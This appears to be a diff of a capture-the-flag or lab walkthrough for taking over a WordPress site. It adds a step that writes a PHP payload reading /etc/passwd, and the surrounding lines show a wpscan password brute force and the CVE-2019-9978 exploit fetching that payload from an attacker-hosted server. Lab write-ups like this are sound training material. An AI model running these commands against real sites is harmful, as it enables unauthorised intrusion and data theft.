@@ -26,6 +26,7 @@ sudo wpscan --url http://192.168.101.58/wordpress/ -U admin,max -P /usr/share/wo
 Found password for max and logged into the admin panel. Nothing much here.
 Check the exploits for outdated plugin: searchsploit social warfare
 Found an exploit for the plugin with RCE
+Create a payload file with content : <pre>system('cat /etc/passwd')</pre>
 use the exploit (cve-2019-9978.py) with command: python2 cve-2019-9978.py --target http://192.168.101.58/wordpress/ --payload-uri http://192.168.211.128:8000/payload.txt
 Exploit GithubLink: https://github.com/hash3liZer/CVE-2019-9978
 
